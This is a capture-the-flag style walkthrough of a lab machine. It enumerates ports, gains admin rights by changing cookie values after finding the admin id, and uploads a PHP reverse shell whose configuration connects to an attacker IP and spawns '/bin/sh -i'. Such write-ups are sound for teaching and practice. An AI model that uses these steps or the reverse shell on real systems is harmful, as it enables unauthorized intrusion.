## Enumeration

`nmap -p- 10.129.95.191 -sC -sV -v --min-rate 5000`

We can see that port 22 and port 80 are open. We'll open the web browser and search for the ip and lets check the website out for any vulnerabilities.

Initially we see that, it doesnt lead us to anywhere but then when you scroll down...theres a hint

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

By this, we can confirm that there's a login page but before we proceed with directory and page enumeration. we can try to map the website by using BurpSuite proxy\
\
I've used BurpSuite and this is the resultant sitemap\

here, the [http://10.129.95.191/](http://10.129.95.191/)cdn-cgi/login/script.js is very interesting.

we can visit this on out browser...lets go ahead

i tried brute forcing manually but sadly no results but theres also an option to login as guest...lets go ahead and try that&#x20;

<figure><img src="../../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

As we can see...theres an uploads section...lets go ahead and check that out

<figure><img src="../../../.gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>

we need super admin rights for that...we need to surely escalate our privileges...lets try by checking the cookies and try manipulating them...

i went to inspect the page and i see that we are logged in as guest and out user value is 2233 and its possible that if we find the user value of super admin we can escalate...

I checked the browser for url where there's id in the url...we can try changing the value of id to enumerate

<figure><img src="../../../.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

\
and yee we found it and the id is 1...this info disclosure vuln...lets see if we can succeed...now lets see if we can change the values for user and role

<figure><img src="../../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

i changed the values and now we can upload the file...



## Foothold

Now that we got access to the upload form we can attempt to upload a PHP reverse shell.

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.140'; // CHANGE THIS WITH YOUR IP
$port = 4444; // CHANGE THIS WITH YOUR LISTENING PORT
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
<SNIP>
?>
```

i've uploaded the php file now lets use gobuster to find the directory so that we can implement reverse shell...

```
gobuster dir --url http://10.129.95.191/ --wordlist
/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
```

The gobuster immediately found the /uploads directory. We don't have permission to access\
the directory but we can try access our uploaded file.

I've setup the netcat connection.

Then request our shell through the browser or curl
